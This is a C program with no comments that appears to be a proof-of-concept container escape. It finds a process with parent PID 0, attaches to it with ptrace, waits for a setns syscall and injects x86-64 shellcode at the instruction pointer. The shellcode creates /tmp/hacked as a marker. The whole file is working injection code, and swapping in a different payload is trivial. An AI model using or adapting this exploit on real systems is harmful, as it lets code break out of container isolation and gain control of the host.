#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>

char *shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x2f\x6d\x6b\x64\x69\x72\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x50\x48\x89\xe7\x52\x48\xbb\x2f\x2f\x68\x61\x63\x6b\x65\x64\x53\x48\xbb\x2f\x74\x6d\x70\x2f\x2f\x2f\x2f\x53\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05";

int main (int argc, char **argv) {
  DIR *dir;
  FILE *fp;
  struct dirent *dp;
  int pid = 999;
  int ppid = 999;
  int found = 0;

  for (found = 0; found == 0;) {
    dir = opendir("/proc");
    if (dir == NULL) {
      perror("opendir");
      return 1;
    }

    for (dp = readdir(dir); dp != NULL; dp = readdir(dir)) {
      int len = 11 + strlen(dp->d_name) + 1;
      char *stat_file = malloc(len);
      if (stat_file == NULL) {
        perror("malloc");
        return 1;
      }
      snprintf(stat_file, len, "/proc/%s/stat", dp->d_name);
      fp = fopen(stat_file, "r");

      if (fp != NULL) {
        fscanf(fp, "%d %*s %*c %d", &pid, &ppid);
        fclose(fp);
        if (pid != 1 && ppid == 0) {
          printf("Found: %s\n", stat_file);
          found = 1;
          break;
        }
      }
      free(stat_file);
    }
    closedir(dir);
  }

  int status;
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace");
    return 1;
  }
  if (waitpid(pid, &status, 0) < 0) {
    perror("waitpid");
    return 1;
  }

  if (WIFEXITED(status)) {
    printf("Exited with status: %d", status);
    return 1;
  } else if (WIFSIGNALED(status)) {
    printf("terminated by signal %d\n", WTERMSIG(status));
  } else if (WIFSTOPPED(status)) {
    printf("stopped by signal %d\n", WSTOPSIG(status));
  }

  while (1) {
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    if (waitpid(pid, &status, 0) < 0) {
      perror("waitpid");
      return 1;
    }

    if (!(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP)) {
      return 1;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    if (regs.rax != -ENOSYS) {
      continue;
    }

    if (regs.orig_rax == SYS_setns && regs.rsi == CLONE_NEWUTS) {
      int size = strlen(shellcode);
      char *buf = (char*)malloc(size);
      memset(buf, 0x0, size);
      memcpy(buf, shellcode, size);

      int i;
      for (i = 0; i < size; i++) {
        ptrace(PTRACE_POKETEXT, pid, regs.rip + i, *(int *)(buf + i));
      }

      ptrace(PTRACE_DETACH, pid, 0, 0);
      free(buf);
      break;
    }
  }
 
  return 0;
}
